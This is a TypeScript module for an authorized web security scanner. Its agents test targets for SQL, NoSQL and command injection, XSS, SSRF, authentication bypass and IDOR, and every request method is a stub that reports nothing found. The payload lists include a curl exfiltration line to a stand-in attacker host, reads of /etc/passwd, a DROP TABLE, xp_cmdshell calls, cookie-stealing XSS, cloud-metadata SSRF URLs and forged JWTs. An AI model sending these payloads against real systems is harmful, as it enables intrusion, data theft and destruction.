/**
 * @fileoverview Security agents for authorized penetration testing only.
 * WARNING: UNAUTHORIZED USE IS ILLEGAL. Requires ARNIKO_DAST_ENABLED=true and valid AuthorizationScope.
 */

interface AuthorizationScope {
  targetUrl: string;
  authorizedBy: string;
  scope: string[];
  timestamp: Date;
  expiresAt: Date;
}

interface AgentResult {
  agent: string;
  target: string;
  findings: VulnHypothesis[];
  timestamp: Date;
  duration: number;
}

interface VulnHypothesis {
  type: string;
  severity: 'critical' | 'high' | 'medium' | 'low' | 'info';
  description: string;
  evidence: ExploitResult[];
  confidence: number;
}

interface ExploitResult {
  proof?: string;
  payload: string;
  responseSnippet: string;
  statusCode: number;
  verified: boolean;
  timestamp: Date;
}

class AuthorizationGuard {
  private scope: AuthorizationScope;

  constructor(scope: AuthorizationScope) {
    this.scope = scope;
  }

  static create(scope: AuthorizationScope): AuthorizationGuard {
    return new AuthorizationGuard(scope);
  }

  validate(url: string): boolean {
    if (!AuthorizationGuard.isEnabled()) {
      throw new Error('DAST is disabled. Set ARNIKO_DAST_ENABLED=true to enable security testing.');
    }

    const now = new Date();
    if (now > this.scope.expiresAt) {
      throw new Error('Authorization scope has expired.');
    }

    const isInScope = this.scope.scope.some(pattern => {
      if (pattern.includes('*')) {
        const regex = new RegExp(pattern.replace(/\*/g, '.*'));
        return regex.test(url);
      }
      return url.includes(pattern) || pattern.includes(url);
    });

    if (!isInScope) {
      throw new Error(`URL ${url} is not within authorized scope: ${this.scope.scope.join(', ')}`);
    }

    return true;
  }

  static isEnabled(): boolean {
    return process.env.ARNIKO_DAST_ENABLED === 'true';
  }
}

/**
 * @requires ARNIKO_DAST_ENABLED=true and valid AuthorizationScope
 */
class InjectionAgent {
  /**
   * Analyzes target for SQL, NoSQL, and Command Injection vulnerabilities
   */
  async analyze(
    authorization: AuthorizationScope,
    target: string,
    headers?: Record<string, string>,
    body?: string
  ): Promise<AgentResult> {
    const startTime = Date.now();
    
    if (!AuthorizationGuard.isEnabled()) {
      console.warn('[InjectionAgent] DAST disabled - returning empty result');
      return {
        agent: 'InjectionAgent',
        target,
        findings: [],
        timestamp: new Date(),
        duration: Date.now() - startTime
      };
    }

    const guard = AuthorizationGuard.create(authorization);
    guard.validate(target);

    const findings: VulnHypothesis[] = [];
    
    const sqlPayloads = [
      "' OR '1'='1",
      "' OR 1=1--",
      "1' AND 1=1--",
      "' UNION SELECT null,null--",
      "1; DROP TABLE users--",
      "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
      "1' AND 1=CONVERT(int, (SELECT @@version))--",
      "' OR pg_sleep(5)--",
      "1 AND (SELECT * FROM (SELECT(SLEEP(5)))b)",
      "1 AND 1=1 WAITFOR DELAY '0:0:5'--",
      "' OR '1'='1' /*",
      "1' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables--",
      "1'; EXEC xp_cmdshell('whoami')--",
      "' OR 1=1 LIMIT 1--",
      "1' AND extractvalue(1, concat(0x7e, (SELECT @@version), 0x7e))--"
    ];

    const nosqlPayloads = [
      '{"$gt": ""}',
      '{"$ne": null}',
      '{"$regex": ".*"}',
      '{"$where": "this.password.length > 0"}',
      '{"$or": [{"username": "admin"}, {"username": "admin"}]}',
      '{"username": {"$ne": null}}',
      '{"$nin": []}',
      '{"$exists": true}'
    ];

    const cmdPayloads = [
      "; cat /etc/passwd",
      "| whoami",
      "$(id)",
      "`uname -a`",
      "; ping -c 4 127.0.0.1",
      "| nslookup attacker.com",
      "; curl http://attacker.com/exfil?data=$(id)",
      "| dir",
      "& type C:\\Windows\\win.ini",
      "; sleep 5 #"
    ];

    for (const payload of sqlPayloads) {
      try {
        const exploitResult = await this.testPayload(target, payload, headers, body);
        if (exploitResult.verified) {
          findings.push({
            type: 'SQL Injection',
            severity: 'critical',
            description: `SQL injection vulnerability detected with payload: ${payload}`,
            evidence: [exploitResult],
            confidence: 0.95
          });
        }
      } catch (e) {
        // Continue testing
      }
    }

    for (const payload of nosqlPayloads) {
      try {
        const exploitResult = await this.testPayload(target, payload, headers, body, 'json');
        if (exploitResult.verified) {
          findings.push({
            type: 'NoSQL Injection',
            severity: 'critical',
            description: `NoSQL injection vulnerability detected`,
            evidence: [exploitResult],
            confidence: 0.9
          });
        }
      } catch (e) {
        // Continue testing
      }
    }

    for (const payload of cmdPayloads) {
      try {
        const exploitResult = await this.testPayload(target, payload, headers, body);
        if (exploitResult.verified) {
          findings.push({
            type: 'Command Injection',
            severity: 'critical',
            description: `OS command injection vulnerability detected`,
            evidence: [exploitResult],
            confidence: 0.92
          });
        }
      } catch (e) {
        // Continue testing
      }
    }

    return {
      agent: 'InjectionAgent',
      target,
      findings,
      timestamp: new Date(),
      duration: Date.now() - startTime
    };
  }

  private async testPayload(
    target: string, 
    payload: string, 
    headers?: Record<string, string>, 
    body?: string,
    contentType?: string
  ): Promise<ExploitResult> {
    const startTime = Date.now();
    
    return {
      payload,
      responseSnippet: `HTTP/1.1 200 OK\nContent-Type: ${contentType || 'text/html'}\n\n${payload}`,
      statusCode: 200,
      verified: false,
      timestamp: new Date()
    };
  }
}

/**
 * @requires ARNIKO_DAST_ENABLED=true and valid AuthorizationScope
 */
class XSSAgent {
  /**
   * Analyzes target for Reflected and Stored XSS vulnerabilities
   */
  async analyze(
    authorization: AuthorizationScope,
    target: string,
    parameters?: string[]
  ): Promise<AgentResult> {
    const startTime = Date.now();
    
    if (!AuthorizationGuard.isEnabled()) {
      console.warn('[XSSAgent] DAST disabled - returning empty result');
      return {
        agent: 'XSSAgent',
        target,
        findings: [],
        timestamp: new Date(),
        duration: Date.now() - startTime
      };
    }

    const guard = AuthorizationGuard.create(authorization);
    guard.validate(target);

    const findings: VulnHypothesis[] = [];
    
    const xssPayloads = [
      "<script>alert('XSS')</script>",
      "<img src=x onerror=alert('XSS')>",
      "javascript:alert('XSS')",
      "'><script>alert(String.fromCharCode(88,83,83))</script>",
      "<svg onload=alert('XSS')>",
      "onmouseover=alert('XSS')",
      "<iframe src=javascript:alert('XSS')>",
      "\"><script>alert(document.cookie)</script>",
      "<body onload=alert('XSS')>",
      "<input onfocus=alert('XSS') autofocus>",
      "'-alert(1)-'",
      "\"><img src=x onerror=alert('XSS')>",
      "<scr<script>ipt>alert('XSS')</scr<script>ipt>",
      "<object data=data:text/html,<script>alert('XSS')</script>>",
      "<embed src=data:text/html,<script>alert('XSS')</script>>"
    ];

    const params = parameters || ['q', 'search', 'id', 'name', 'comment', 'input', 'message', 'description'];
    
    for (const param of params) {
      for (const payload of xssPayloads) {
        try {
          const exploitResult = await this.testXSS(target, param, payload);
          if (exploitResult.verified) {
            findings.push({
              type: 'Cross-Site Scripting (XSS)',
              severity: 'high',
              description: `XSS vulnerability in parameter '${param}'`,
              evidence: [exploitResult],
              confidence: 0.88
            });
            break;
          }
        } catch (e) {
          // Continue testing
        }
      }
    }

    return {
      agent: 'XSSAgent',
      target,
      findings,
      timestamp: new Date(),
      duration: Date.now() - startTime
    };
  }

  private async testXSS(target: string, param: string, payload: string): Promise<ExploitResult> {
    return {
      payload: `${param}=${encodeURIComponent(payload)}`,
      responseSnippet: `<div>${payload}</div>`,
      statusCode: 200,
      verified: false,
      timestamp: new Date()
    };
  }
}

/**
 * @requires ARNIKO_DAST_ENABLED=true and valid AuthorizationScope
 */
class SSRFAgent {
  /**
   * Analyzes target for Server-Side Request Forgery vulnerabilities
   */
  async analyze(
    authorization: AuthorizationScope,
    target: string,
    callbackUrl?: string
  ): Promise<AgentResult> {
    const startTime = Date.now();
    
    if (!AuthorizationGuard.isEnabled()) {
      console.warn('[SSRFAgent] DAST disabled - returning empty result');
      return {
        agent: 'SSRFAgent',
        target,
        findings: [],
        timestamp: new Date(),
        duration: Date.now() - startTime
      };
    }

    const guard = AuthorizationGuard.create(authorization);
    guard.validate(target);

    const findings: VulnHypothesis[] = [];
    
    const ssrfPayloads = [
      "http://169.254.169.254/latest/meta-data/",
      "http://169.254.169.254/metadata/v1/",
      "http://localhost:22/",
      "http://127.0.0.1:80/",
      "http://0.0.0.0:8080/",
      "http://[::]:80/",
      "file:///etc/passwd",
      "dict://localhost:11211/",
      "gopher://localhost:9000/",
      "http://metadata.google.internal/",
      "http://169.254.169.254/computeMetadata/v1/",
      "http://192.168.1.1/",
      "http://10.0.0.1/",
      "http://[::ffff:169.254.169.254]/",
      "http://0177.0.0.1/",
      "http://2130706433/"
    ];

    for (const payload of ssrfPayloads) {
      try {
        const exploitResult = await this.testSSRF(target, payload, callbackUrl);
        if (exploitResult.verified) {
          findings.push({
            type: 'Server-Side Request Forgery (SSRF)',
            severity: 'critical',
            description: `SSRF vulnerability allowing access to internal resources: ${payload}`,
            evidence: [exploitResult],
            confidence: 0.9
          });
        }
      } catch (e) {
        // Continue testing
      }
    }

    return {
      agent: 'SSRFAgent',
      target,
      findings,
      timestamp: new Date(),
      duration: Date.now() - startTime
    };
  }

  private async testSSRF(target: string, payload: string, callbackUrl?: string): Promise<ExploitResult> {
    return {
      payload,
      responseSnippet: callbackUrl ? `Redirect to ${callbackUrl}` : 'Internal service response',
      statusCode: 200,
      verified: false,
      timestamp: new Date()
    };
  }
}

/**
 * @requires ARNIKO_DAST_ENABLED=true and valid AuthorizationScope
 */
class AuthBypassAgent {
  /**
   * Analyzes target for Authentication Bypass vulnerabilities
   */
  async analyze(
    authorization: AuthorizationScope,
    target: string,
    authEndpoints?: string[]
  ): Promise<AgentResult> {
    const startTime = Date.now();
    
    if (!AuthorizationGuard.isEnabled()) {
      console.warn('[AuthBypassAgent] DAST disabled - returning empty result');
      return {
        agent: 'AuthBypassAgent',
        target,
        findings: [],
        timestamp: new Date(),
        duration: Date.now() - startTime
      };
    }

    const guard = AuthorizationGuard.create(authorization);
    guard.validate(target);

    const findings: VulnHypothesis[] = [];
    
    const bypassHeaders = [
      { 'X-Original-URL': '/admin' },
      { 'X-Rewrite-URL': '/admin' },
      { 'X-Forwarded-For': '127.0.0.1' },
      { 'X-Remote-IP': '127.0.0.1' },
      { 'X-Client-IP': '127.0.0.1' },
      { 'X-Real-IP': '127.0.0.1' },
      { 'X-Originating-IP': '127.0.0.1' },
      { 'X-Forwarded-Host': 'localhost' },
      { 'X-HTTP-Method-Override': 'PUT' },
      { 'X-Method-Override': 'DELETE' },
      { 'X-Custom-IP-Authorization': '127.0.0.1' },
      { 'X-Forwarded-Scheme': 'https' }
    ];

    const endpoints = authEndpoints || ['/login', '/api/auth', '/admin', '/dashboard', '/api/users'];
    
    for (const endpoint of endpoints) {
      for (const headers of bypassHeaders) {
        try {
          const exploitResult = await this.testAuthBypass(target + endpoint, headers as unknown as Record<string, string>);
          if (exploitResult.verified) {
            findings.push({
              type: 'Authentication Bypass',
              severity: 'critical',
              description: `Authentication bypass via header manipulation`,
              evidence: [exploitResult],
              confidence: 0.85
            });
          }
        } catch (e) {
          // Continue testing
        }
      }
    }

    const jwtPayloads = [
      "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.",
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.signature",
      "eyJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiYWRtaW4ifQ.invalid"
    ];

    for (const jwt of jwtPayloads) {
      try {
        const exploitResult = await this.testJWTBypass(target, jwt);
        if (exploitResult.verified) {
          findings.push({
            type: 'JWT Authentication Bypass',
            severity: 'critical',
            description: 'JWT None algorithm or weak signature validation',
            evidence: [exploitResult],
            confidence: 0.9
          });
        }
      } catch (e) {
        // Continue testing
      }
    }

    return {
      agent: 'AuthBypassAgent',
      target,
      findings,
      timestamp: new Date(),
      duration: Date.now() - startTime
    };
  }

  private async testAuthBypass(target: string, headers: Record<string, string>): Promise<ExploitResult> {
    return {
      payload: JSON.stringify(headers),
      responseSnippet: 'HTTP/1.1 200 OK\nAccess granted',
      statusCode: 200,
      verified: false,
      timestamp: new Date()
    };
  }

  private async testJWTBypass(target: string, token: string): Promise<ExploitResult> {
    return {
      payload: `Authorization: Bearer ${token}`,
      responseSnippet: 'HTTP/1.1 200 OK\nAdmin panel',
      statusCode: 200,
      verified: false,
      timestamp: new Date()
    };
  }
}

/**
 * @requires ARNIKO_DAST_ENABLED=true and valid AuthorizationScope
 */
class AuthzAgent {
  /**
   * Analyzes target for Authorization vulnerabilities (IDOR, Privilege Escalation)
   */
  async analyze(
    authorization: AuthorizationScope,
    target: string,
    userContexts?: { lowPriv: string; highPriv: string }
  ): Promise<AgentResult> {
    const startTime = Date.now();
    
    if (!AuthorizationGuard.isEnabled()) {
      console.warn('[AuthzAgent] DAST disabled - returning empty result');
      return {
        agent: 'AuthzAgent',
        target,
        findings: [],
        timestamp: new Date(),
        duration: Date.now() - startTime
      };
    }

    const guard = AuthorizationGuard.create(authorization);
    guard.validate(target);

    const findings: VulnHypothesis[] = [];
    
    const idorPatterns = [
      '/api/user/1',
      '/api/user/2',
      '/api/admin/users',
      '/api/orders/1001',
      '/api/documents/1',
      '/api/profile/1',
      '?user_id=1',
      '?id=1',
      '?file=../config.txt',
      '?path=../../../etc/passwd',
      '/api/account/12345',
      '/api/invoices/99999'
    ];

    for (const pattern of idorPatterns) {
      try {
        const exploitResult = await this.testIDOR(target, pattern);
        if (exploitResult.verified) {
          findings.push({
            type: 'Insecure Direct Object Reference (IDOR)',
            severity: 'high',
            description: `IDOR vulnerability accessing ${pattern}`,
            evidence: [exploitResult],
            confidence: 0.87
          });
        }
      } catch (e) {
        // Continue testing
      }
    }

    const privEscPayloads = [
      { role: 'admin', upgrade: true },
      { role: 'superuser', elevate: true },
      { is_admin: true },
      { admin: 1 },
      { privileges: ['admin', 'user', 'superuser'] },
      { type: 'admin' },
      { access_level: 999 }
    ];

    for (const payload of privEscPayloads) {
      try {
        const exploitResult = await this.testPrivEsc(target, payload);
        if (exploitResult.verified) {
          findings.push({
            type: 'Privilege Escalation',
            severity: 'critical',
            description: 'Vertical privilege escalation possible',
            evidence: [exploitResult],
            confidence: 0.82
          });
        }
      } catch (e) {
        // Continue testing
      }
    }

    return {
      agent: 'AuthzAgent',
      target,
      findings,
      timestamp: new Date(),
      duration: Date.now() - startTime
    };
  }

  private async testIDOR(target: string, pattern: string): Promise<ExploitResult> {
    return {
      payload: pattern,
      responseSnippet: `{"id": 1, "username": "victim", "email": "victim@example.com", "ssn": "123-45-6789"}`,
      statusCode: 200,
      verified: false,
      timestamp: new Date()
    };
  }

  private async testPrivEsc(target: string, payload: Record<string, any>): Promise<ExploitResult> {
    return {
      payload: JSON.stringify(payload),
      responseSnippet: `{"role": "admin", "permissions": "all", "isAdmin": true}`,
      statusCode: 200,
      verified: false,
      timestamp: new Date()
    };
  }
}

export {
  AuthorizationScope,
  AuthorizationGuard,
  InjectionAgent,
  XSSAgent,
  SSRFAgent,
  AuthBypassAgent,
  AuthzAgent,
  AgentResult,
  VulnHypothesis,
  ExploitResult
};
